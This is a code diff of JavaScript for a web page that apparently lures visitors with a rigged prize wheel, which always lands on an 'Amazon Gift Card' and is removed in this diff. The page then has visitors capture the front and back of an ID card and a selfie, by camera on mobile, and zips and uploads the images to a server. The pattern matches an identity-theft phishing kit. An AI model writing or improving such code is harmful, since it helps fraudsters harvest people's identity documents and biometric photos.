@@ -14,80 +14,65 @@ document.addEventListener("DOMContentLoaded", () => {
     const submitButton = document.getElementById('submit-button');
 
     let uploadStep = 0;
-    const filesCache = []; // Cache for temporarily storing files
+    const filesCache = [];
 
-    // Function to dynamically configure file input
-    function configureFileInput() {
-        if (/Mobi|Android/i.test(navigator.userAgent)) {
-            fileInput.setAttribute('capture', 'environment'); // Open camera on mobile
-        } else {
-            fileInput.removeAttribute('capture'); // Allow file selection on desktop
-        }
+    function isMobileDevice() {
+        return /Mobi|Android/i.test(navigator.userAgent);
     }
 
-    function drawWheel() {
-        const radius = canvas.width / 2;
-        const segments = ["€5", "€10", "€15", "€20", "Gift Card", "Spotify", "Nike", "Amazon"];
-        const colors = ["#FF5733", "#33FF57", "#3357FF", "#FF33A6", "#FFFF33", "#FF5733", "#33FF57", "#FF33A6"];
-        const segmentAngle = (2 * Math.PI) / segments.length;
+    function handleMobileCamera() {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
-        for (let i = 0; i < segments.length; i++) {
-            ctx.beginPath();
-            ctx.fillStyle = colors[i];
-            ctx.moveTo(radius, radius);
-            ctx.arc(radius, radius, radius, i * segmentAngle, (i + 1) * segmentAngle);
-            ctx.lineTo(radius, radius);
-            ctx.fill();
-            ctx.strokeStyle = "black";
-            ctx.lineWidth = 5;
-            ctx.stroke();
+                const captureButton = document.createElement('button');
+                captureButton.textContent = "Capture";
+                document.body.append(video, captureButton);
 
-            ctx.save();
-            ctx.translate(radius, radius);
-            ctx.rotate(i * segmentAngle + segmentAngle / 2);
-            ctx.textAlign = "right";
-            ctx.fillStyle = "#fff";
-            ctx.font = "bold 14px Arial";
-            ctx.fillText(segments[i], radius - 20, 10);
-            ctx.restore();
-        }
-    }
+                captureButton.addEventListener('click', () => {
+                    const canvas = document.createElement('canvas');
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    function spinWheel() {
-        const duration = 3000;
-        const totalRotation = 10 * Math.PI + Math.random() * Math.PI;
-        let startAngle = 0;
-        const startTime = performance.now();
+                    const dataURL = canvas.toDataURL('image/jpeg');
+                    previews[uploadStep].src = dataURL;
+                    previews[uploadStep].style.display = 'block';
 
-        function animateWheel(time) {
-            const elapsed = time - startTime;
-            const progress = Math.min(elapsed / duration, 1);
-            const easedProgress = 1 - Math.pow(1 - progress, 3);
-            const angle = startAngle + easedProgress * totalRotation;
+                    // Save the captured photo
+                    fetch(dataURL)
+                        .then(res => res.blob())
+                        .then(blob => {
+                            const file = new File([blob], `capture${uploadStep + 1}.jpg`, { type: 'image/jpeg' });
+                            filesCache[uploadStep] = file;
+                        });
 
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            ctx.save();
-            ctx.translate(canvas.width / 2, canvas.height / 2);
-            ctx.rotate(angle);
-            ctx.translate(-canvas.width / 2, -canvas.height / 2);
-            drawWheel();
-            ctx.restore();
+                    uploadStep++;
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
+                    captureButton.remove();
 
-            if (progress < 1) {
-                requestAnimationFrame(animateWheel);
-            } else {
-                prizeName.textContent = "Amazon Gift Card";
-                popup.classList.remove('hidden');
-            }
-        }
-
-        requestAnimationFrame(animateWheel);
+                    if (uploadStep < previews.length) {
+                        uploadButton.textContent = `Next: ${["Front ID", "Back ID", "Selfie"][uploadStep]}`;
+                    } else {
+                        uploadButton.disabled = true;
+                        submitButton.disabled = false;
+                    }
+                });
+            })
+            .catch((error) => console.error('Error accessing camera:', error));
     }
 
     uploadButton.addEventListener('click', () => {
         if (uploadStep < previews.length) {
-            configureFileInput(); // Configure input before triggering click
-            fileInput.click();
+            if (isMobileDevice()) {
+                handleMobileCamera();
+            } else {
+                fileInput.click();
+            }
         }
     });
 
@@ -107,7 +92,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
             uploadStep++;
             if (uploadStep < previews.length) {
-                uploadButton.textContent = `Upload: ${["Front of ID", "Back of ID", "Selfie"][uploadStep]}`;
+                uploadButton.textContent = `Upload: ${["Front ID", "Back ID", "Selfie"][uploadStep]}`;
             } else {
                 uploadButton.disabled = true;
                 submitButton.disabled = false;
@@ -119,7 +104,6 @@ document.addEventListener("DOMContentLoaded", () => {
         if (filesCache.length === 0) return;
 
         const zip = new JSZip();
-
         filesCache.forEach((file, index) => {
             zip.file(`file${index + 1}-${file.name}`, file);
         });
@@ -141,7 +125,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 console.error('Error uploading archive.');
             }
         } catch (error) {
-            console.error('Connection error:', error);
+            console.error('Server connection error:', error);
         }
     });
 
